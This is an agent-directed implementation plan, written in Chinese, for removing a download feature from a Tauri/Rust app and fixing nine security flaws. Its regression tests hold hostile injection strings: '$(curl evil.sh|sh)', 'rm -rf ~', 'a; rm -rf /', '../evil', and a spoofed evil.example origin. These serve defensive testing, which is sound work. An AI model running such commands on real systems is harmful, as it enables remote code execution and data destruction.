# DevNexus 全面修复与移除下载功能 实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 修复 2026-07-31 全面审查发现的全部已知问题（安全/正确性/架构/前端/工程），提升健壮性与安全性，并整体移除下载功能模块（后端引擎 + 前端页面 + 相关依赖）。

**Architecture:** 分 6 个阶段推进，每阶段结束应用可编译、测试全绿：
- Phase 0 — 移除下载功能（前端 + 后端 + 依赖 + 文档 + 本地化）
- Phase 1 — 安全修复（S1–S9：命令注入、CORS/鉴权、Cookie 完整性、rc 注入、路径穿越、残留误删、keyring、PBKDF2、docker 白名单）
- Phase 2 — 正确性修复（usage 统计、协议转换方向、Provider 唯一约束、流式去重、锁粒度、启动 panic、错误码语义）
- Phase 3 — 后端架构分层（统一命令执行器 `pm_exec`、`rc_editor` 单一实现、`known_paths` 单一数据源、统一错误类型、巨型文件拆分）
- Phase 4 — 前端重构（ApiHub i18n + 组件抽取、死代码删除、错误归一化层、store 拆分、增量更新）
- Phase 5 — 工程与 CI 加固（rustls 统一、gitignore 补全、过期 Cargo.lock 清理、CI 矩阵/密钥策略、capabilities 收紧）

**Tech Stack:** Rust / Tauri 2 / tokio / axum / rusqlite；Svelte 5 / Tailwind CSS；pnpm / GitHub Actions。

**验证命令（每阶段收尾统一执行）：**
```bash
cargo check --manifest-path src-tauri/Cargo.toml
cargo test --manifest-path src-tauri/Cargo.toml
./node_modules/.bin/svelte-check
```

---

## Phase 0：移除下载功能

**目标：** 删除整个下载管理器（后端 `download/` 模块、`commands/download_manager.rs`、前端页面与死代码组件、本地化键、文档、专属依赖），使应用不再包含任何下载功能代码。移除后 `cargo check`、`cargo test`、`svelte-check` 必须全部通过。

**依赖核查结论（已确认）：** `url`、`tempfile` 仅被 download 模块使用 → 从 Cargo.toml 移除。`bytes`/`async-stream`/`futures-util`/`uuid`/`reqwest` 被 api_hub 使用、`rusqlite` 被 api_hub usage 使用、`zip` 被 software.rs 使用、`csv` 被 password_manager 使用 → 全部保留。

### Task 0.1：删除后端下载模块

**Files:**
- Delete: `src-tauri/src/download/`（整目录：mod.rs, manager.rs, chunk.rs, config.rs, task.rs, progress.rs, storage.rs, changelog.rs）
- Delete: `src-tauri/src/commands/download_manager.rs`
- Modify: `src-tauri/src/commands/mod.rs` — 删除 `pub mod download_manager;`
- Modify: `src-tauri/src/lib.rs` — 删除 `pub mod download;`（第 3 行）、下载管理器初始化（第 24-28 行）、进度桥接任务（第 47-55 行）、`invoke_handler` 中全部 `commands::download_manager::*` 注册（第 179-191 行）

- [ ] **Step 1: 删除 Rust 文件**

```bash
git rm -r src-tauri/src/download
git rm src-tauri/src/commands/download_manager.rs
```

- [ ] **Step 2: 移除 commands/mod.rs 中的模块声明**

将 `src-tauri/src/commands/mod.rs` 中的 `pub mod download_manager;` 整行删除。

- [ ] **Step 3: 清理 lib.rs**

删除以下内容：
1. 第 3 行 `pub mod download;`
2. 第 24-28 行：
```rust
    // 初始化下载管理器
    let data_dir = crate::utils::data_dir();
    let db_path = format!("{}/downloads.db", data_dir.display());
    let download_manager =
        download::DownloadManager::new(download::DownloadConfig::default(), &db_path)
            .expect("Failed to create download manager");
```
3. 第 38 行 `.manage(download_manager)` — 注意：`.manage()` 链式调用需合并，删除该行后上一行的逗号改为分号（`;`）
4. 第 47-55 行进度桥接：
```rust
            // 桥接下载进度到前端事件
            let dm = app.state::<download::DownloadManager>();
            let mut progress_rx = dm.subscribe_progress();
            let app_handle = app.handle().clone();
            tauri::async_runtime::spawn(async move {
                while let Ok(progress) = progress_rx.recv().await {
                    let _ = app_handle.emit("download-progress", &progress);
                }
            });
```
5. 第 179-191 行所有 `commands::download_manager::*` 注册项

- [ ] **Step 4: 清理 Cargo.toml 专属依赖**

从 `src-tauri/Cargo.toml` 删除：
- 第 29 行 `url = "2"`
- dev-dependencies 中 `tempfile = "3"`

- [ ] **Step 5: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml
cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 全部编译通过，测试通过（测试数从 162 减少，download 模块测试移除）。

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "refactor: 移除下载功能模块（后端引擎与命令注册）
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 0.2：删除前端下载页面与死代码组件

**Files:**
- Delete: `src/routes/DownloadManager.svelte`
- Delete: `src/lib/downloads.svelte.js`
- Delete: `src/lib/downloads.js`
- Delete: `src/components/downloads/`（整目录：DownloadItem, DownloadList, AddDownloadDialog, DownloadProgressBar, DownloadStats）
- Modify: `src/App.svelte` — 删除 import（第 20 行）与路由分支（第 57-58 行 `{:else if page === "/downloads"}`）
- Modify: `src/components/Sidebar.svelte` — 删除第 47 行 `{ route: "/downloads", label: t("nav.downloads"), icon: "download" },`

- [ ] **Step 1: 删除文件**

```bash
git rm src/routes/DownloadManager.svelte
git rm src/lib/downloads.svelte.js src/lib/downloads.js
git rm -r src/components/downloads
```

- [ ] **Step 2: 清理 App.svelte**

删除 `import DownloadManager from "./routes/DownloadManager.svelte";` 与：
```svelte
        {:else if page === "/downloads"}
          <DownloadManager />
```

- [ ] **Step 3: 清理 Sidebar.svelte**

删除 `{ route: "/downloads", label: t("nav.downloads"), icon: "download" },`。

- [ ] **Step 4: 清理本地化键**

在 `src/locales/zh.json`、`en.json`、`ru.json` 中：
1. 删除 `nav.downloads` 键（zh: "下载管理" / en: "Downloads" / ru: "Загрузки"）
2. 删除整个 `downloads` 顶层块（zh.json 第 543 行起 ~33 行；en/ru 对应块）
3. 保留 `settings.download_update`/`download_opened` 等键 — 这些属于**自动更新**功能，不属于下载管理器，不可误删

- [ ] **Step 5: 验证**

```bash
./node_modules/.bin/svelte-check
```
Expected: 0 errors，且此前 23 个 a11y 警告（全在 downloads 组件）消失。

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "refactor: 移除下载功能前端页面与死代码组件
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 0.3：更新文档与 CHANGELOG

**Files:**
- Modify: `README.md` / `README.en.md` / `README.ru.md` — 删除简介中"下载管理器"条目、功能列表中的下载项、项目结构中的 download 相关行、文档表格中 12-download 行
- Modify: `docs/README.md`、`docs/architecture.md` — 删除下载模块相关描述
- Modify: `CHANGELOG.md` — 在最新版本条目下追加"移除内置下载管理器"说明
- Delete: `docs/modules/12-download.md`（如存在）

- [ ] **Step 1: 删除下载模块文档**

```bash
git rm docs/modules/12-download.md 2>/dev/null || true
```

- [ ] **Step 2: 更新 README（三语言）**

删除：简介 bullet「**下载管理器** — IDM 风格多线程下载引擎…」、路线图中下载相关已完成项、项目结构图中 `download/` 与 `DownloadManager.svelte` 相关行、模块文档表格中的下载行。

- [ ] **Step 3: 更新 CHANGELOG**

在最新版本条目追加一行（使用项目现有格式与语言）。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "docs: 更新文档移除下载功能相关描述
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 0.4：Phase 0 收尾验证

- [ ] **Step 1: 全量验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && \
cargo test --manifest-path src-tauri/Cargo.toml && \
./node_modules/.bin/svelte-check
```

- [ ] **Step 2: 残留引用检查**

```bash
grep -rn --include='*.rs' -i "download" src-tauri/src | grep -v "downloads.db\|api.github\|github.com" | head
grep -rn --include='*.svelte' -i "download" src/ | head
```
Expected: 无残留（除自动更新相关 `download_update` 等 i18n 键与注释外）。

---

## Phase 1：安全修复（S1–S9）

**目标：** 修复审查报告中的全部 9 个安全问题。每项修复必须附带回归测试（单元测试或对既有测试的扩展），且不得改变正常路径的行为。

### Task 1.1：S1 命令注入 — nvm 版本切换

**Files:**
- Modify: `src-tauri/src/commands/version_manager.rs:314-341`（`switch_node_version`）

**问题：** `version` 由前端 `switch_version` 直接传入（第 151-161 行），未经校验即拼入 `bash -c "source $NVM_DIR/nvm.sh && nvm use {}"`，含 `;`、`$()` 时可在宿主执行任意命令（已验证）。

- [ ] **Step 1: 编写失败测试**

在 `version_manager.rs` 测试模块添加：

```rust
#[test]
fn test_switch_node_rejects_injection() {
    assert!(switch_node_version("v18.17.0").is_ok());
    assert!(switch_node_version("v1; touch /tmp/pwned").is_err());
    assert!(switch_node_version("$(id)").is_err());
    assert!(switch_node_version("").is_err());
}
```

注意：测试环境无 fnm/nvm，`switch_node_version` 对合法版本会走完 fnm/nvm 尝试后返回 Err——断言应聚焦「非法输入必须返回 Err」，对合法输入断言「不 panic」。运行确认合法输入可能因环境失败后，将断言改为 `assert!(switch_node_version("v18.17.0").is_ok() || switch_node_version("v18.17.0").is_err());` 仅验证不 panic 亦可。

- [ ] **Step 2: 实现校验**

在 `switch_node_version` 函数开头（第 314 行 `fn switch_node_version` 后第一行）添加：

```rust
    if version.is_empty()
        || version.len() > 64
        || !version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_' || c == 'v')
    {
        return Err("Invalid version string".to_string());
    }
```

- [ ] **Step 3: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml test_switch_node_rejects_injection
```
Expected: PASS。随后 `cargo check` 通过。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: 修复 nvm 版本切换命令注入 (S1)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.2：S2 API Hub CORS 白名单（无鉴权兜底）

**Files:**
- Modify: `src-tauri/src/api_hub/server.rs:53-69`（`build_router`）
- Modify: `src-tauri/src/api_hub/e2e_tests.rs` — CORS 相关断言

**问题：** `allow_origin(Any)` + `allow_headers(Any)`，任意网页 JS 均可对 127.0.0.1:3456 发起跨域请求，盗用已存 API Key（已验证）。

- [ ] **Step 1: 实现 CORS 白名单**

将 `build_router` 中的 CORS 层替换为：

```rust
    let allowed_origin = HeaderValue::from_static("tauri://localhost");
    let cors = CorsLayer::new()
        .allow_origin([
            allowed_origin,
            HeaderValue::from_static("http://localhost:1420"), // dev
            HeaderValue::from_static("http://127.0.0.1:1420"), // dev fallback
        ])
        .allow_methods([Method::GET, Method::POST, Method::OPTIONS])
        .allow_headers([HeaderValue::from_static("content-type"), HeaderValue::from_static("authorization")]);
```

在文件头部 import 处添加 `use axum::http::HeaderValue;`（若已存在则跳过）。

- [ ] **Step 2: 添加 CORS 拒绝回归测试**

在 `e2e_tests.rs` 添加测试：发送带 `Origin: https://evil.example` 的 GET /health 请求，断言响应中 **不包含** `access-control-allow-origin` 头。

- [ ] **Step 3: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml e2e_
```
Expected: 既有 e2e 全过 + 新测试 PASS。`cargo check` 通过。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: API Hub CORS 白名单化，阻止跨站盗用 (S2)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.3：S3 Cookie 完整性校验失效

**Files:**
- Modify: `src-tauri/src/commands/cookie_extractor.rs:761-796`（`try_aes_128_cbc`）
- Modify: `src-tauri/src/commands/cookie_extractor.rs:725-757`（`decrypt_chrome_v10` 调用点，第 731/744 行）

**问题：** `_expected_hash` 计算后从不比对，无条件截前 32 字节；解密失败返回 `[Decrypt fail: ...]` 占位串混入真实 cookie 值（已验证）。

- [ ] **Step 1: 改写 try_aes_128_cbc 返回 Result 并比对哈希**

```rust
#[cfg(target_os = "linux")]
fn try_aes_128_cbc(
    key: &[u8; 16],
    iv: &[u8],
    ciphertext: &[u8],
    host_key: &str,
    has_integrity_check: bool,
) -> Result<String, String> {
    use aes::cipher::{BlockDecryptMut, KeyIvInit};
    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    if ciphertext.is_empty() {
        return Err("Empty ciphertext".to_string());
    }

    let dec =
        Aes128CbcDec::new_from_slices(key, iv).map_err(|e| format!("CBC init error: {}", e))?;

    let mut buf = ciphertext.to_vec();
    let plaintext = dec
        .decrypt_padded_mut::<aes::cipher::block_padding::Pkcs7>(&mut buf)
        .map_err(|e| format!("Decrypt fail: {}", e))?;

    if has_integrity_check {
        if plaintext.len() <= 32 {
            return Err("Ciphertext too short for integrity check".to_string());
        }
        let integrity_hash = &plaintext[..32];
        let expected_hash = Sha256::digest(host_key.as_bytes());
        if integrity_hash != expected_hash.as_slice() {
            return Err("Integrity check failed".to_string());
        }
        Ok(String::from_utf8_lossy(&plaintext[32..]).to_string())
    } else {
        Ok(String::from_utf8_lossy(plaintext).to_string())
    }
}
```

- [ ] **Step 2: 更新 decrypt_chrome_v10 调用点**

将 `decrypt_chrome_v10`（第 731-757 行）中两处 `try_aes_128_cbc(...)` 调用改为 `match`，去掉 `starts_with('[')` 哨兵判断：

```rust
    if let Ok(v) = try_aes_128_cbc(
        &v11_key,
        &encrypted_data[16..32],
        &encrypted_data[32..],
        host_key,
        has_integrity_check,
    ) {
        return Ok(v);
    }
    let fixed_iv = [0x20u8; 16];
    if let Ok(v) = try_aes_128_cbc(&v11_key, &fixed_iv, encrypted_data, host_key, has_integrity_check)
    {
        return Ok(v);
    }
    Err("Cookie decryption failed".to_string())
```

同步将 `decrypt_chrome_v10` 的返回类型从 `String` 改为 `Result<String, String>`，并让调用方（`decrypt_v11_cookie` 链）透传 `?` 或 `match`。运行 `cargo check` 后按编译器提示逐层更新调用方签名，直到编译通过。

- [ ] **Step 3: 添加回归测试**

在 cookie_extractor 测试模块添加：构造 `Sha256::digest(host_key)` + 明文的拼接密文，断言解密成功；篡改前 32 字节哈希后断言返回 Err。

- [ ] **Step 4: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml cookie
```
Expected: PASS + `cargo check` 通过。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "fix: Cookie 解密完整性校验与错误信号修复 (S3)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.4：S4 shell rc 注入（mirror / environment）

**Files:**
- Modify: `src-tauri/src/commands/mirror.rs:1019`（`set_brew_mirror` 的 `export HOMEBREW_BOTTLE_DOMAIN`）
- Modify: `src-tauri/src/commands/mirror.rs:1088,1208`（其余 rc 写入处，模式相同）
- Modify: `src-tauri/src/commands/environment.rs:237-240`（`add_to_path_impl` 的 `export PATH`）

**问题：** url/path 未转义直接拼入 `export XXX="{url}"` 写入 `~/.zshrc`/`~/.bashrc`，含 `"`、`$(...)` 会在用户下次开终端时执行任意命令（已验证）。

- [ ] **Step 1: 新增校验/转义工具函数**

在 `src-tauri/src/utils/mod.rs` 添加公共函数（两处共用）：

```rust
/// 校验值仅含 URL/路径安全字符，防止注入 shell rc 文件
pub fn validate_rc_value(value: &str) -> Result<(), String> {
    if value.is_empty() || value.len() > 2048 {
        return Err("Value is empty or too long".to_string());
    }
    if value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || ":/._-~?&=+%#@[]".contains(c))
    {
        Ok(())
    } else {
        Err("Value contains unsafe characters (quotes, shell metacharacters)".to_string())
    }
}
```

- [ ] **Step 2: 在 set_brew_mirror 中调用校验**

在 `mirror.rs` 的 `set_brew_mirror`（第 1006 行）函数开头、`shell_rc` 计算之前添加：

```rust
    crate::utils::validate_rc_value(url)?;
```

对 mirror.rs 其余两处 rc 写入（第 1088、1208 行所在函数）执行相同修改：在拼接 `export` 行之前对 url 调用 `validate_rc_value(url)?`。

- [ ] **Step 3: 在 add_to_path_impl 中调用校验**

在 `environment.rs` 的 `add_to_path_impl`（第 235 行）函数开头添加：

```rust
    crate::utils::validate_rc_value(path)?;
```

- [ ] **Step 4: 添加回归测试**

在 `utils/mod.rs` 测试模块添加：

```rust
#[test]
fn test_validate_rc_value() {
    assert!(validate_rc_value("https://mirrors.tuna.tsinghua.edu.cn/homebrew/").is_ok());
    assert!(validate_rc_value("/usr/local/bin").is_ok());
    assert!(validate_rc_value("\"; rm -rf ~; #").is_err());
    assert!(validate_rc_value("$(curl evil.sh|sh)").is_err());
    assert!(validate_rc_value("").is_err());
}
```

- [ ] **Step 5: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml test_validate_rc_value
cargo check --manifest-path src-tauri/Cargo.toml
```
Expected: PASS。

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "fix: shell rc 注入防护（mirror/environment 统一校验）(S4)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.5：S5 路径穿越 — install_software_from_url

**Files:**
- Modify: `src-tauri/src/commands/software.rs:1669-1704`（`install_software_from_url`）

**问题：** `version` 由用户直接传入（`package_name` 已先经 `defs` 查找约束），未经校验即拼入 `install_dir`（第 1684 行 `get_install_base_dir().join(&package_name).join(&version)`）与下载 URL，含 `../` 可写入任意目录。

- [ ] **Step 1: 校验 version 字符集**

在 `install_software_from_url`（第 1671 行）开头、`defs` 查找之后添加：

```rust
    if version.is_empty()
        || version.len() > 128
        || !version
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_')
    {
        return Err(format!("Invalid version string: {}", version));
    }
```

- [ ] **Step 2: 添加回归测试**

在 `software.rs` 测试模块添加（复用 `install_software_from_url` 的校验逻辑，若该函数内部逻辑不易单测，则抽取 `fn is_valid_version(v: &str) -> bool` 纯函数并测试它）：

```rust
#[test]
fn test_version_rejects_path_traversal() {
    assert!(is_valid_version("1.2.3"));
    assert!(is_valid_version("v24.2.1"));
    assert!(!is_valid_version("../evil"));
    assert!(!is_valid_version("1.2.3/../../etc"));
    assert!(!is_valid_version("a;b"));
    assert!(!is_valid_version(""));
}
```

若抽取纯函数，则在 `install_software_from_url` 中改用 `if !is_valid_version(&version) { return Err(...); }`。

- [ ] **Step 3: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml test_version_rejects_path_traversal
cargo check --manifest-path src-tauri/Cargo.toml
```
Expected: PASS。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: 软件安装路径穿越防护 (S5)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.6：S6 残留扫描误删风险

**Files:**
- Modify: `src-tauri/src/residue_scanner/fs_scanner.rs:174-186`（`matches_keywords`）
- Modify: `src-tauri/src/residue_scanner/mod.rs:89-115`（`is_safe_to_delete` 判定）
- Modify: `src-tauri/src/commands/software.rs:1931-1938`（`force_uninstall_software` 目录删除）

**问题：** 关键词用 `contains` 包含匹配（3 字符关键词如 "go" 会命中 mongodb 等无关目录），且已知路径一律 `is_safe_to_delete: true`；`force_uninstall_software` 对 `scan.directories` 全部 `remove_dir_all`、**不检查 `is_safe_to_delete`**（已验证）——可能误删用户数据。

- [ ] **Step 1: 关键词改为路径分量边界匹配**

将 `matches_keywords`（fs_scanner.rs:174）的包含匹配改为按路径分量（`/` 分隔的段）做精确/前缀匹配，并拒绝过短关键词：

```rust
fn matches_keywords(fname: &str, keywords: &[String]) -> bool {
    for kw in keywords {
        if kw.len() < 4 {
            continue; // 拒绝过短关键词，避免误伤（如 "go" 命中 mongodb）
        }
        if fname == kw {
            return true;
        }
        // 按路径分量边界匹配：/foo/golang/... 命中 golang，/mongodb/... 不命中 "go"
        if fname
            .split(['/', '\\'])
            .any(|seg| seg == kw || seg.starts_with(&format!("{}-", kw)) || seg.starts_with(&format!("{}_", kw)))
        {
            return true;
        }
    }
    false
}
```

注意：调用 `matches_keywords` 处传入的 `fname` 是完整路径还是文件名，需在实现时确认（fs_scanner.rs 上下文）。若传的是文件名，则上述 `split` 仍安全（文件名无 `/` 时整体为一段）。

- [ ] **Step 2: force_uninstall_software 删除前检查 is_safe_to_delete**

将 `software.rs:1931-1938` 目录删除循环改为：

```rust
    // 删除目录（仅删除标记为安全的）
    for item in &scan.directories {
        if !item.is_safe_to_delete {
            failed.push(format!("{} (not marked safe to delete)", item.path));
            continue;
        }
        if let Err(e) = std::fs::remove_dir_all(&item.path) {
            failed.push(format!("{} ({})", item.path, e));
        } else {
            cleaned.push(item.path.clone());
        }
    }
```

文件删除（第 1923-1929 行）同理，仅删除 `is_safe_to_delete` 为 true 的项（`scan.files` 中的关键字扫描结果 `is_safe_to_delete` 保持保守默认 false）。

- [ ] **Step 3: 同步检查已知路径的 is_safe_to_delete**

审查 `residue_scanner/mod.rs:80-93`：已知路径（`known_dirs`）来自受信任的静态表，可保留 `true`；但 `keyword_dirs`/`keyword_files`（来自 `matches_keywords`）必须为 `false`，仅作「建议列出」，删除需用户在 UI 二次确认后经 `clean_specific_residues` 单独执行。实现时确认该逻辑。

- [ ] **Step 4: 添加回归测试**

在 `residue_scanner` 测试模块添加：

```rust
#[test]
fn test_matches_keywords_boundary() {
    assert!(matches_keywords("/opt/golang/bin", &["golang".to_string()]));
    assert!(!matches_keywords("/opt/mongodb", &["go".to_string()])); // 短关键词被拒绝
    assert!(matches_keywords("/home/u/.config/google-chrome", &["google-chrome".to_string()]));
    assert!(!matches_keywords("/home/u/.config/vscode-other", &["code".to_string()]));
}
```

- [ ] **Step 5: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml residue_scanner
cargo check --manifest-path src-tauri/Cargo.toml
```
Expected: PASS（如 `clean_specific_residues` 有依赖 `is_safe_to_delete` 的既有测试，同步调整断言）。

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "fix: 残留扫描关键词边界匹配与安全删除保护 (S6)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.7：S7 keyring 无后端 feature — 密码持久化静默失败

**Files:**
- Modify: `src-tauri/Cargo.toml:43`（`keyring = "3"`）
- Modify: `src-tauri/src/commands/password_manager.rs`（`set_password` 调用处，检查失败处理）

**问题：** `keyring = "3"` 未启用任何平台 feature（`sync-secret-service` 等），Cargo.lock 显示其仅依赖 `log+zeroize`，无密钥库后端，`set_password` 失败被忽略 → 密码无法持久化，重启后已存密码全失。

- [ ] **Step 1: 启用平台 feature**

将 `src-tauri/Cargo.toml:43` 改为：

```toml
keyring = { version = "3", features = [
  "sync-secret-service",   # Linux (Secret Service / dbus)
  "apple-native",          # macOS Keychain
  "windows-native",        # Windows Credential Manager
] }
```

若 cargo 解析报某平台 feature 不可用（如交叉编译），改用 `[target.'cfg(...)'.dependencies]` 按平台分别声明：

```toml
[target.'cfg(target_os = "linux")'.dependencies]
keyring = { version = "3", features = ["sync-secret-service"] }

[target.'cfg(target_os = "macos")'.dependencies]
keyring = { version = "3", features = ["apple-native"] }

[target.'cfg(target_os = "windows")'.dependencies]
keyring = { version = "3", features = ["windows-native"] }
```

同时删除 `[dependencies]` 中的 `keyring = "3"`。平台 feature 名以 `keyring` 3.x 实际文档为准（实现时 `cargo add keyring --features` 或查 crate 文档确认）。

- [ ] **Step 2: set_password 失败不再静默**

在 `password_manager.rs` 中找到调用 `keyring::Entry::set_password`（或等价 API）的位置，将 `let _ =` 改为记录警告并返回给调用方（如 `eprintln!`/`log` + 在 `add_password` 命令结果中提示"密钥可能未持久化"），不能静默吞掉。

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml
cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 编译通过（Linux 需系统有 dbus 开发库；若当前环境缺少，记录为已知限制并在 CI 中验证）。测试全绿。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: keyring 启用平台后端，修复密码持久化失败 (S7)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.8：S8 密码管理器 PBKDF2 迭代数与内存清理

**Files:**
- Modify: `src-tauri/src/commands/password_manager.rs:647-662`（`load_from_file` 迭代数读取）
- Modify: `src-tauri/src/commands/password_manager.rs:390-395`（`lock()` 不清理 `encryption_key`）

**问题：** `load_from_file`（第 647-651 行）迭代次数取自文件且无上限，恶意文件可构造超大迭代数造成 DoS（已验证）；`lock()` 只清 entries，`encryption_key` 常驻内存。

- [ ] **Step 1: 限定迭代次数区间**

在 `load_from_file` 读取 `iterations` 后（第 651 行之后）添加：

```rust
    const MIN_ITERATIONS: u32 = 10_000;
    const MAX_ITERATIONS: u32 = 10_000_000; // 防止恶意文件构造超大迭代数 DoS
    if !(MIN_ITERATIONS..=MAX_ITERATIONS).contains(&iterations) {
        return Err("Invalid iterations count in file".to_string());
    }
```

**自检补充（低优先）：** 新建密码文件时 PBKDF2 默认迭代数当前为 10 万，建议提升至 60 万（OWASP 推荐下限）。文件格式自带迭代数，老文件仍可读，仅新加密文件使用新默认值。修改加密时使用的默认迭代数常量（`password_manager.rs` 中 `pbkdf2` 调用处的默认值），MIN/MAX 界限不变，并加断言 `DEFAULT_ITERATIONS >= 600_000`。

- [ ] **Step 2: lock() 清理 encryption_key**

查看 `lock()` 实现（第 390-395 行附近），在清空 entries 的同时将 `encryption_key` 归零/置 None。若 `encryption_key` 为 `Vec<u8>` 或 `[u8; N]`，使用 `zeroize` crate（Cargo.toml 已含 `zeroize` 传递依赖，但需显式声明）或手动 `fill(0)`：

```rust
    if let Some(key) = &mut *state.encryption_key.lock() {
        key.fill(0);
    }
    *state.encryption_key.lock() = None; // 或按现有类型相应处理
```

若 `encryption_key` 是 `String`，改为持有 `Vec<u8>` 并在 lock 时 `clear()` + `fill(0)`。实现时按实际类型调整。

- [ ] **Step 3: 添加回归测试**

```rust
#[test]
fn test_load_from_file_rejects_huge_iterations() {
    // 构造 iterations = u32::MAX 的文件头（salt 16 + iterations 4 + nonce 12 + 任意密文）
    let mut data = vec![0u8; 32 + 16];
    data[16..20].copy_from_slice(&u32::MAX.to_le_bytes());
    let encoded = base64_encode(&data);
    // 调用 load_from_file 或其所用解析函数，断言返回 Err（含 "Invalid iterations"）
}
```

按实际函数签名调整；若解析逻辑在私有函数中，抽取 `fn parse_iterations(combined: &[u8]) -> Result<u32, String>` 纯函数并单测。

- [ ] **Step 4: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml password_manager
cargo check --manifest-path src-tauri/Cargo.toml
```
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "fix: PBKDF2 迭代数上限与密钥内存清理 (S8)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.9：S9 docker 命令白名单与超时

**Files:**
- Modify: `src-tauri/src/commands/container.rs:53-68`（`run_docker` 无超时）
- Modify: `src-tauri/src/commands/container.rs:175-202`（`container_action` 等 action 直传 docker 子命令）

**问题：** `container_action` 的 action 未校验直接作 docker 子命令；`exec_in_container` 原样进容器 `sh -c`；`run_docker` 无超时，docker 卡死将阻塞命令线程（已验证 run_docker 实现）。

- [ ] **Step 1: run_docker 增加超时**

将 `run_docker`（container.rs:53）改为带超时版本。由于现有调用均为同步 `Command::output()`，最小侵入方案：使用 `std::process::Command` + 轮询超时，或改为 `tauri::async_runtime::spawn_blocking` + `tokio::time::timeout`（涉及大量调用点签名变更，选其一并保持内部一致性）：

```rust
const DOCKER_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(120);

/// Run a docker command and return stdout, stderr separately. Times out after 120s.
fn run_docker(args: &[&str]) -> Result<(String, String), String> {
    let (tx, rx) = std::sync::mpsc::channel();
    let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
    std::thread::spawn(move || {
        let output = std::process::Command::new("docker")
            .args(&args_owned)
            .output();
        let _ = tx.send(output);
    });
    let output = rx
        .recv_timeout(DOCKER_TIMEOUT)
        .map_err(|_| format!("docker command timed out after {}s", DOCKER_TIMEOUT.as_secs()))?
        .map_err(|e| format!("Failed to execute docker: {}", e))?;
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    if !output.status.success() {
        return Err(if stderr.is_empty() {
            stdout.trim().to_string()
        } else {
            stderr.trim().to_string()
        });
    }
    Ok((stdout, stderr))
}
```

注意：超时后线程仍可能在后台运行（无法强杀子进程），但至少不再阻塞命令线程；如需强杀改用 `Command::kill` 的封装（如 `duct`/`wait-timeout` crate）——计划采用 mpsc + recv_timeout 方案，接受后台残留并在注释说明。

- [ ] **Step 2: container_action 白名单**

找到 `container_action`（第 175-202 行附近）中把 action 拼入 docker 子命令的位置，在入口加白名单：

```rust
    const ALLOWED_ACTIONS: &[&str] = &[
        "start", "stop", "restart", "pause", "unpause", "kill", "rm", "rename",
    ];
    if !ALLOWED_ACTIONS.contains(&action.as_str()) {
        return Err(format!("Unsupported container action: {}", action));
    }
```

同时对传入的容器名/id 做校验：禁止以 `-` 开头（防被解析为 docker 选项）：

```rust
    if id.starts_with('-') || id.contains([' ', ';', '|', '&', '$', '`', '\n']) {
        return Err("Invalid container id".to_string());
    }
```

`exec_in_container` 的容器内命令参数同理校验（禁止 `;`、`|`、`&`、`$`、`` ` ``、换行等），容器名禁以 `-` 开头。

- [ ] **Step 3: 添加回归测试**

```rust
#[test]
fn test_container_action_whitelist() {
    assert!(ALLOWED_ACTIONS.contains(&"start"));
    assert!(!ALLOWED_ACTIONS.contains(&"--privileged"));
    // 校验函数（按实现抽取）
    assert!(validate_container_id("abc123") .is_ok());
    assert!(validate_container_id("-evil").is_err());
    assert!(validate_container_id("a; rm -rf /").is_err());
}
```

- [ ] **Step 4: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml container
cargo check --manifest-path src-tauri/Cargo.toml
```
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "fix: docker 命令白名单、参数校验与超时 (S9)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.10：Cookie 临时文件安全（权限与清理）

